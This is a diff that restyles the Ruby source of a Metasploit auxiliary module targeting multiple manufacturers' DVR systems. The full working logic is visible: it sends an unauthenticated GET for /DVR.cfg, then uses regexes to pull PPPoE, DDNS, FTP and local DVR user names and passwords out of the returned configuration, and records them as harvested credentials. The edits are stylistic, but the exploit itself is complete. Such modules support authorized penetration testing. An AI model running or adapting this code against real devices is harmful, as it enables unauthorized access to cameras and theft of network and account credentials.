@@ -1,13 +1,12 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::Scanner
@@ -15,11 +14,11 @@ class MetasploitModule < Msf::Auxiliary
   def initialize
     super(
       'Name'        => 'Multiple DVR Manufacturers Configuration Disclosure',
-      'Description' => %q{
+      'Description' => %q(
           This module takes advantage of an authentication bypass vulnerability at the
         web interface of multiple manufacturers DVR systems, which allows to retrieve the
         device configuration.
-      },
+      ),
       'Author'      =>
         [
           'Alejandro Ramos', # Vulnerability Discovery
@@ -32,45 +31,31 @@ class MetasploitModule < Msf::Auxiliary
         ],
       'License'     => MSF_LICENSE
     )
-
   end
 
   def get_pppoe_credentials(conf)
-
     user = ""
     password = ""
     enabled = ""
 
-    if conf =~ /PPPOE_EN=(\d)/
-      enabled = $1
-    end
+    enabled = Regexp.last_match(1) if conf =~ /PPPOE_EN=(\d)/
 
     return if enabled == "0"
 
-    if conf =~ /PPPOE_USER=(.*)/
-      user = $1
-    end
+    user = Regexp.last_match(1) if conf =~ /PPPOE_USER=(.*)/
 
-    if conf =~ /PPPOE_PASSWORD=(.*)/
-      password = $1
-    end
+    password = Regexp.last_match(1) if conf =~ /PPPOE_PASSWORD=(.*)/
 
-    if user.empty? or password.empty?
-      return
-    end
+    return if user.empty? || password.empty?
 
     info = "PPPOE credentials for #{rhost}, user: #{user}, password: #{password}"
 
-    report_note({
-      :host   => rhost,
-      :data   => info,
-      :type   => "dvr.pppoe.conf",
-      :sname  => 'pppoe',
-      :update => :unique_data
-    })
-
+    report_note(host: rhost,
+                data: info,
+                type: "dvr.pppoe.conf",
+                sname: 'pppoe',
+                update: :unique_data)
   end
-
 
   def get_ddns_credentials(conf)
     hostname = ""
@@ -78,38 +63,25 @@ class MetasploitModule < Msf::Auxiliary
     password = ""
     enabled = ""
 
-    if conf =~ /DDNS_EN=(\d)/
-      enabled = $1
-    end
+    enabled = Regexp.last_match(1) if conf =~ /DDNS_EN=(\d)/
 
     return if enabled == "0"
 
-    if conf =~ /DDNS_HOSTNAME=(.*)/
-      hostname = $1
-    end
+    hostname = Regexp.last_match(1) if conf =~ /DDNS_HOSTNAME=(.*)/
 
-    if conf =~ /DDNS_USER=(.*)/
-      user = $1
-    end
+    user = Regexp.last_match(1) if conf =~ /DDNS_USER=(.*)/
 
-    if conf =~ /DDNS_PASSWORD=(.*)/
-      password = $1
-    end
+    password = Regexp.last_match(1) if conf =~ /DDNS_PASSWORD=(.*)/
 
-    if hostname.empty?
-      return
-    end
+    return if hostname.empty?
 
     info = "DDNS credentials for #{hostname}, user: #{user}, password: #{password}"
 
-    report_note({
-      :host   => rhost,
-      :data   => info,
-      :type   => "dvr.ddns.conf",
-      :sname  => 'ddns',
-      :update => :unique_data
-    })
-
+    report_note(host: rhost,
+                data: info,
+                type: "dvr.ddns.conf",
+                sname: 'ddns',
+                update: :unique_data)
   end
 
   def get_ftp_credentials(conf)
@@ -118,25 +90,15 @@ class MetasploitModule < Msf::Auxiliary
     password = ""
     port = ""
 
-    if conf =~ /FTP_SERVER=(.*)/
-      server = $1
-    end
+    server = Regexp.last_match(1) if conf =~ /FTP_SERVER=(.*)/
 
-    if conf =~ /FTP_USER=(.*)/
-      user = $1
-    end
+    user = Regexp.last_match(1) if conf =~ /FTP_USER=(.*)/
 
-    if conf =~ /FTP_PASSWORD=(.*)/
-      password = $1
-    end
+    password = Regexp.last_match(1) if conf =~ /FTP_PASSWORD=(.*)/
 
-    if conf =~ /FTP_PORT=(.*)/
-      port = $1
-    end
+    port = Regexp.last_match(1) if conf =~ /FTP_PORT=(.*)/
 
-    if server.empty?
-      return
-    end
+    return if server.empty?
 
     report_cred(
       ip: server,
@@ -175,30 +137,24 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def get_dvr_credentials(conf)
-    conf.scan(/USER(\d+)_USERNAME/).each { |match|
+    conf.scan(/USER(\d+)_USERNAME/).each do |match|
       user = ""
       password = ""
       active = ""
 
       user_id = match[0]
 
-      if conf =~ /USER#{user_id}_LOGIN=(.*)/
-        active = $1
-      end
+      active = Regexp.last_match(1) if conf =~ /USER#{user_id}_LOGIN=(.*)/
 
-      if conf =~ /USER#{user_id}_USERNAME=(.*)/
-        user = $1
-      end
+      user = Regexp.last_match(1) if conf =~ /USER#{user_id}_USERNAME=(.*)/
 
-      if conf =~ /USER#{user_id}_PASSWORD=(.*)/
-        password = $1
-      end
+      password = Regexp.last_match(1) if conf =~ /USER#{user_id}_PASSWORD=(.*)/
 
-      if active == "0"
-        user_active = false
-      else
-        user_active = true
-      end
+      user_active = if active == "0"
+                      false
+                    else
+                      true
+                    end
 
       report_cred(
         ip: rhost,
@@ -208,7 +164,7 @@ class MetasploitModule < Msf::Auxiliary
         password: password,
         proof: "user_id: #{user_id}, active: #{active}"
       )
-    }
+    end
   end
 
   def report_cred(opts)
@@ -237,14 +193,11 @@ class MetasploitModule < Msf::Auxiliary
     create_credential_login(login_data)
   end
 
-  def run_host(ip)
+  def run_host(_ip)
+    res = send_request_cgi('uri' => '/DVR.cfg',
+                           'method' => 'GET')
 
-    res = send_request_cgi({
-      'uri'          => '/DVR.cfg',
-      'method'       => 'GET'
-    })
-
-    if not res or res.code != 200 or res.body.empty? or res.body !~ /CAMERA/
+    if !res || (res.code != 200) || res.body.empty? || res.body !~ /CAMERA/
       vprint_error("#{rhost}:#{rport} - DVR configuration not found")
       return
     end
@@ -260,12 +213,9 @@ class MetasploitModule < Msf::Auxiliary
     get_pppoe_credentials(conf)
 
     dvr_name = ""
-    if res.body =~ /DVR_NAME=(.*)/
-      dvr_name = $1
-    end
+    dvr_name = Regexp.last_match(1) if res.body =~ /DVR_NAME=(.*)/
 
-    report_service(:host => rhost, :port => rport, :sname => 'dvr', :info => "DVR NAME: #{dvr_name}")
+    report_service(host: rhost, port: rport, sname: 'dvr', info: "DVR NAME: #{dvr_name}")
     print_good("#{rhost}:#{rport} DVR #{dvr_name} found")
   end
-
 end
